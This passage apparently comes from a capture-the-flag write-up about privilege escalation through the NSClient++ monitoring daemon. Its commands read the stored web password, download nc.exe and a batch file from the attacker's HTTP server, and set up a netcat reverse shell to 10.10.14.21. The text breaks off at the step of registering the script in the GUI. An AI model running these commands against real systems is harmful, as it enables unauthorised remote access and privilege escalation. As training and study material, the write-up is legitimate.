NSClient++ (nscp) aims to be a simple yet powerful and flexible monitoring daemon. It was built for Nagios/Icinga/Naemon, but nothing in the daemon is Nagios/Icinga specific and it can and is used in many other scenarios where you want to receive/distribute check metrics. It is entirely possible to use it stand alone as well as the core monitoring system though that is not recommended as it is rather limited.


```
C:\Program Files\NSClient++>nscp web -- password --display
```

Create `shell.bat`:

```bat
\programdata\nc.exe 10.10.14.21 443 -e cmd
```

This assumes that `nc.exe` is in `C:\programdata`

Upload `nc64.exe` and `shell.bat` to `C:\programdata\`. I started a Python HTTP server on my host, and used PowerShell’s `wget` command:'

```cmd
powershell wget http://10.10.14.24/nc.exe -outfile nc.exe
powershell wget http://10.10.14.24/shell.bat -outfile shell.bat
```

In the NSClient++ GUI, first I’ll associate my script with a command by clicking Settings > external scripts > scripts, and then “+Add new”.
